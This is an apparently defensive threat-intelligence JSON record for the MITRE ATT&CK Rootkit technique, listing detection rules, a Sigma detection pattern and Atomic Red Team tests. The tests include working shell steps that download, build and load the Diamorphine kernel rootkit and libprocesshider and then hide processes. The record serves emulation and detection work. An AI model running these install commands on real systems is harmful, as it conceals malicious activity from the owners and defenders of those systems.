{
    "id": "T1014",
    "name": "Rootkit",
    "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits)\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](T1542.001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
    "platforms": "Linux, macOS, Windows",
    "kill_chain_phases": "Defense Evasion",
    "data_sources": "Drive: Drive Modification, Firmware: Firmware Modification",
    "detection": "Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)",
    "url": "https://attack.mitre.org/techniques/T1014",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1014",
                "atomic_attack_guid": "75483ef8-f10f-444a-bf02-62eb0e48db6f",
                "atomic_attack_name": "Loadable Kernel Module based Rootkit",
                "platform": "Linux",
                "splunk_rules": [
                    {
                        "rule_name": "Linux Install Kernel Module Using Modprobe Utility",
                        "rule_link": "https://research.splunk.com/endpoint/387b278a-6326-11ec-aa2c-acde48001122/"
                    },
                    {
                        "rule_name": "Linux Sudo OR Su Execution",
                        "rule_link": "https://research.splunk.com/endpoint/4b00f134-6d6a-11ec-a90c-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1014",
                "atomic_attack_guid": "dfb50072-e45a-4c75-a17e-a484809c8553",
                "atomic_attack_name": "Loadable Kernel Module based Rootkit",
                "platform": "Linux",
                "splunk_rules": [
                    {
                        "rule_name": "Linux Insert Kernel Module Using Insmod Utility",
                        "rule_link": "https://research.splunk.com/endpoint/18b5a1a0-6326-11ec-943a-acde48001122/"
                    },
                    {
                        "rule_name": "Linux Sudo OR Su Execution",
                        "rule_link": "https://research.splunk.com/endpoint/4b00f134-6d6a-11ec-a90c-acde48001122/"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
                    "5dee2bc3-47ac-4784-a52a-4da2950d210f",
                    "95ddb356-7ba0-4bd9-a889-247262b8946f",
                    "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                    "22236d75-d5a0-4287-bf06-c93b1770860f"
                ],
                "lookup_results": [
                    {
                        "uuid": "0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
                        "lookup_data": {
                            "capec": "CAPEC-552",
                            "mitre-attack-id": "T1014",
                            "mitre-cti:description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                            "mitre-cti:name": "Rootkit",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b', 'created': '2017-05-31T21:30:26.496Z', 'x_mitre_version': '1.1', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1014', 'url': 'https://attack.mitre.org/techniques/T1014'}, {'source_name': 'CrowdStrike Linux Rootkit', 'url': 'https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/', 'description': 'Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.'}, {'source_name': 'BlackHat Mac OSX Rootkit', 'url': 'http://www.blackhat.com/docs/asia-14/materials/Tsai/WP-Asia-14-Tsai-You-Cant-See-Me-A-Mac-OS-X-Rootkit-Uses-The-Tricks-You-Havent-Known-Yet.pdf', 'description': \"Pan, M., Tsai, S. (2014). You canâ€™t see me: A Mac OS X Rootkit uses the tricks you haven't known yet. Retrieved December 21, 2017.\"}, {'source_name': 'Symantec Windows Rootkits', 'url': 'https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf', 'description': 'Symantec. (n.d.). Windows Rootkit Overview. Retrieved December 21, 2017.'}, {'source_name': 'Wikipedia Rootkit', 'url': 'https://en.wikipedia.org/wiki/Rootkit', 'description': 'Wikipedia. (2016, June 1). Rootkit. Retrieved June 2, 2016.'}, {'url': 'https://capec.mitre.org/data/definitions/552.html', 'source_name': 'capec', 'external_id': 'CAPEC-552'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \\n\\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)', 'modified': '2022-05-05T05:09:39.723Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Rootkit', 'x_mitre_detection': 'Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_is_subtechnique': False, 'x_mitre_data_sources': ['Drive: Drive Modification', 'Firmware: Firmware Modification', 'File: File Modification'], 'x_mitre_defense_bypassed': ['Anti-virus', 'File Monitoring', 'Host Intrusion Prevention Systems', 'Application Control', 'Signature-based Detection', 'System Access Controls'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5dee2bc3-47ac-4784-a52a-4da2950d210f",
                        "lookup_data": {
                            "description": "OSINT - BfV Cyber-Brief Nr. 01/2019 - Hinweis auf aktuelle Angriffskampagne -",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5dee2bc3-47ac-4784-a52a-4da2950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1576068623",
                            "uuid": "5dee2bc3-47ac-4784-a52a-4da2950d210f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "95ddb356-7ba0-4bd9-a889-247262b8946f",
                        "lookup_data": {
                            "mitre-attack-id": "T1014",
                            "mitre-cti:description": "Identify potentially malicious software that may contain rootkit functionality, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",
                            "mitre-cti:name": "Rootkit Mitigation",
                            "mitre-cti:type": "course-of-action",
                            "raw": "{'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'course-of-action--95ddb356-7ba0-4bd9-a889-247262b8946f', 'type': 'course-of-action', 'created': '2018-10-17T00:14:20.652Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'external_id': 'T1014', 'url': 'https://attack.mitre.org/mitigations/T1014', 'source_name': 'mitre-attack'}, {'source_name': 'Beechey 2010', 'description': 'Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014.', 'url': 'http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599'}, {'url': 'https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html', 'description': 'Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.', 'source_name': 'Windows Commands JPCERT'}, {'url': 'https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm', 'description': 'NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016.', 'source_name': 'NSA MS AppLocker'}, {'source_name': 'Corio 2008', 'description': 'Corio, C., & Sayana, D. P. (2008, June). Application Lockdown with Software Restriction Policies. Retrieved November 18, 2014.', 'url': 'http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx'}, {'source_name': 'TechNet Applocker vs SRP', 'description': 'Microsoft. (2012, June 27). Using Software Restriction Policies and AppLocker Policies. Retrieved April 7, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/ee791851.aspx'}], 'modified': '2021-08-23T20:25:18.627Z', 'name': 'Rootkit Mitigation', 'description': 'Identify potentially malicious software that may contain rootkit functionality, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)', 'x_mitre_deprecated': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                        "lookup_data": {
                            "description": "FontOnLake: Previously unknown malware family targeting Linux",
                            "link": "http://www.botvrij.eu/data/feed-osint/5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1633682506",
                            "uuid": "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "22236d75-d5a0-4287-bf06-c93b1770860f",
                        "lookup_data": {
                            "description": "Detects default install commands of the Triple Cross eBPF rootkit based on the \"deployer.sh\" script",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/05\ndescription: Detects default install commands of the Triple Cross eBPF rootkit based\n  on the \"deployer.sh\" script\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ' qdisc '\n    - ' filter '\n    CommandLine|contains|all:\n    - ' tc '\n    - ' enp0s3 '\n    Image|endswith: /sudo\nfalsepositives:\n- Unlikely\nid: 22236d75-d5a0-4287-bf06-c93b1770860f\nlevel: high\nlogsource:\n  category: process_creation\n  product: linux\nreferences:\n- https://github.com/h3xduck/TripleCross/blob/1f1c3e0958af8ad9f6ebe10ab442e75de33e91de/apps/deployer.sh\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1014\ntitle: Triple Cross eBPF Rootkit Install Commands\n",
                            "sigma:id": "22236d75-d5a0-4287-bf06-c93b1770860f",
                            "title": "Triple Cross eBPF Rootkit Install Commands",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1014",
                "display_name": "Rootkit",
                "atomic_tests": [
                    {
                        "name": "Loadable Kernel Module based Rootkit",
                        "auto_generated_guid": "dfb50072-e45a-4c75-a17e-a484809c8553",
                        "description": "Loadable Kernel Module based Rootkit\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "rootkit_source_path": {
                                "description": "Path to the rootkit source. Used when prerequisites are fetched.",
                                "type": "path",
                                "default": "PathToAtomicsFolder/T1014/src/Linux"
                            },
                            "rootkit_path": {
                                "description": "Path To rootkit",
                                "type": "string",
                                "default": "PathToAtomicsFolder/T1014/bin"
                            },
                            "rootkit_name": {
                                "description": "Module name",
                                "type": "string",
                                "default": "T1014"
                            }
                        },
                        "dependency_executor_name": "bash",
                        "dependencies": [
                            {
                                "description": "The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)\n",
                                "prereq_command": "if [ -f #{rootkit_path}/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
                                "get_prereq_command": "sudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; fi;\ncp #{rootkit_source_path}/* /tmp/T1014/\ncd /tmp/T1014; make\nmkdir #{rootkit_path}\nmv /tmp/T1014/#{rootkit_name}.ko #{rootkit_path}/#{rootkit_name}.ko\nrm -rf /tmp/T1014\n"
                            }
                        ],
                        "executor": {
                            "command": "sudo insmod #{rootkit_path}/#{rootkit_name}.ko\n",
                            "cleanup_command": "sudo rmmod #{rootkit_name}\nsudo rm -rf #{rootkit_path}\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Loadable Kernel Module based Rootkit",
                        "auto_generated_guid": "75483ef8-f10f-444a-bf02-62eb0e48db6f",
                        "description": "Loadable Kernel Module based Rootkit\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "rootkit_source_path": {
                                "description": "Path to the rootkit source. Used when prerequisites are fetched.",
                                "type": "path",
                                "default": "PathToAtomicsFolder/T1014/src/Linux"
                            },
                            "rootkit_name": {
                                "description": "Module name",
                                "type": "string",
                                "default": "T1014"
                            }
                        },
                        "dependency_executor_name": "bash",
                        "dependencies": [
                            {
                                "description": "The kernel module must exist on disk at specified location (#{rootkit_source_path}/#{rootkit_name}.ko)\n",
                                "prereq_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
                                "get_prereq_command": "sudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;\ncp #{rootkit_source_path}/* /tmp/T1014\ncd /tmp/T1014; make        \nsudo cp /tmp/T1014/#{rootkit_name}.ko /lib/modules/$(uname -r)/\n[ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014\nsudo depmod -a\n"
                            }
                        ],
                        "executor": {
                            "command": "sudo modprobe #{rootkit_name}\n",
                            "cleanup_command": "sudo modprobe -r #{rootkit_name}\nsudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko\nsudo depmod -a\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "dynamic-linker based rootkit (libprocesshider)",
                        "auto_generated_guid": "1338bf0c-fd0c-48c0-9e65-329f18e2c0d3",
                        "description": "Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "repo": {
                                "description": "Url of the github repo zip",
                                "type": "string",
                                "default": "https://github.com/gianlucaborello/libprocesshider/"
                            },
                            "rev": {
                                "description": "Revision of the github repo zip",
                                "type": "string",
                                "default": "25e0587d6bf2137f8792dc83242b6b0e5a72b415"
                            },
                            "library_path": {
                                "description": "Full path of the library to add to ld.so.preload",
                                "type": "string",
                                "default": "/usr/local/lib/libprocesshider.so"
                            }
                        },
                        "dependency_executor_name": "bash",
                        "dependencies": [
                            {
                                "description": "The preload library must exist on disk at specified location (#{library_path})\n",
                                "prereq_command": "if [ -f #{library_path} ]; then exit 0; else exit 1; fi;\n",
                                "get_prereq_command": "mkdir -p /tmp/atomic && cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}\nmake\ncp libprocesshider.so #{library_path}\ncp /usr/bin/ping /usr/local/bin/evil_script.py\n"
                            }
                        ],
                        "executor": {
                            "command": "echo #{library_path} | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"\n",
                            "cleanup_command": "sed -i \"\\:^#{library_path}:d\" /etc/ld.so.preload\nrm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Loadable Kernel Module based Rootkit (Diamorphine)",
                        "auto_generated_guid": "0b996469-48c6-46e2-8155-a17f8b6c2247",
                        "description": "Loads Diamorphine kernel module, which hides itself and a processes.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "repo": {
                                "description": "Url of the diamorphine github repo",
                                "type": "string",
                                "default": "https://github.com/m0nad/Diamorphine/"
                            },
                            "rev": {
                                "description": "Revision of the github repo zip",
                                "type": "string",
                                "default": "898810523aa2033f582a4a5903ffe453334044f9"
                            },
                            "rootkit_name": {
                                "description": "Module name",
                                "type": "string",
                                "default": "diamorphine"
                            }
                        },
                        "dependency_executor_name": "bash",
                        "dependencies": [
                            {
                                "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
                                "prereq_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
                                "get_prereq_command": "mkdir -p /tmp/atomic && cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}\nmake\nsudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/\nsudo depmod -a\n"
                            }
                        ],
                        "executor": {
                            "command": "sudo modprobe #{rootkit_name}\nping -c 10 localhost >/dev/null & TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n",
                            "cleanup_command": "kill -63 1\nsudo modprobe -r #{rootkit_name}\nsudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic\nsudo depmod -a\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 10:52:04"
}